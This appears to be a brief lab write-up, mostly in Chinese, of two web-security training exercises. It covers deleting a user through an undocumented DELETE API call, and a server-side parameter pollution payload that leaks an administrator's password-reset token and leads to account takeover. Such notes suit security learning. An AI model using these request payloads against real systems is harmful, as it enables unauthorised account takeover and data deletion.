# Exploiting an API endpoint using documentation
发现一个api请求，更改方法为delete，删除carlos
DELETE /api/user/carlos HTTP/2

# 利用查询字符串中的服务器端参数污染
Lab: Exploiting server-side parameter pollution in a query string
要求：登陆管理员账号删除carlos
忘记密码功能点输入administrator
![[Pasted image 20241127141510.png]]
看见有个forgotpassword的js
![[Pasted image 20241127141810.png]]
/forgot-password?reset_token=${resetToken}看js内容，有这个路径

```POST请求体
csrf=VcOTyYojxc25BBOOiu5Tx2MM9khcuFD1&username=administrator
```
截断发现响应不一样，通过爆破参数，看返回包等操作
构造这个
```
username=administrator%26field=reset_token%23
```
再去访问/forgot-password?reset_token=123456789，这里的功能点是带着这个token就能该密码